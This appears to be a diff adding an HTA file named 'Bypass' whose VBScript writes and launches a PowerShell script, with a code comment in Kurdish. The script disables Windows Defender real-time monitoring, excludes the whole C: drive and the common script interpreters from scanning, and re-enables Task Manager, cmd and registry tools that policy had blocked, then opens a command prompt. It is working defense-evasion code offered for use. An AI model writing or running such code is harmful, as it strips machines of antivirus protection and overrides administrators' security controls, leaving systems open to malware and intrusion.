@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Bypass</title>
+<HTA:APPLICATION ID="Bypass" APPLICATIONNAME="Bypass" BORDER="thin" CAPTION="yes" SHOWINTASKBAR="yes" SINGLEINSTANCE="yes" SYSMENU="yes" WINDOWSTATE="normal" />
+<script language="VBScript">
+Sub RunBypass()
+    Dim fso, shell, psScript, tempPath, psFile
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    Set shell = CreateObject("WScript.Shell")
+    tempPath = shell.ExpandEnvironmentStrings("%TEMP%")
+    psFile = tempPath & "\bypass.ps1"
+    
+    ' ناوەڕۆکی PowerShell بۆ شکاندنی بەربەستەکان
+    psScript = "$ErrorActionPreference = 'SilentlyContinue';" & vbCrLf & _
+               "Set-ExecutionPolicy Bypass -Scope Process -Force;" & vbCrLf & _
+               "Set-MpPreference -DisableRealtimeMonitoring $true;" & vbCrLf & _
+               "Add-MpPreference -ExclusionPath 'C:\';" & vbCrLf & _
+               "Add-MpPreference -ExclusionProcess 'cmd.exe','powershell.exe','wscript.exe','cscript.exe','mshta.exe';" & vbCrLf & _
+               "New-Item -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System' -Force | Out-Null;" & vbCrLf & _
+               "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'DisableTaskMgr' -Value 0 -Force;" & vbCrLf & _
+               "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'DisableCMD' -Value 0 -Force;" & vbCrLf & _
+               "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'DisableRegistryTools' -Value 0 -Force;" & vbCrLf & _
+               "Write-Host 'Bypass complete.';" & vbCrLf & _
+               "Start-Process cmd.exe -ArgumentList '/k echo Bypass active. Type commands.'" & vbCrLf
+    
+    Dim ts
+    Set ts = fso.CreateTextFile(psFile, True)
+    ts.Write psScript
+    ts.Close
+    
+    shell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File """ & psFile & """", 1, False
+End Sub
+</script>
+</head>
+<body>
+<button onclick="RunBypass()">Run Bypass</button>
+</body>
+</html>
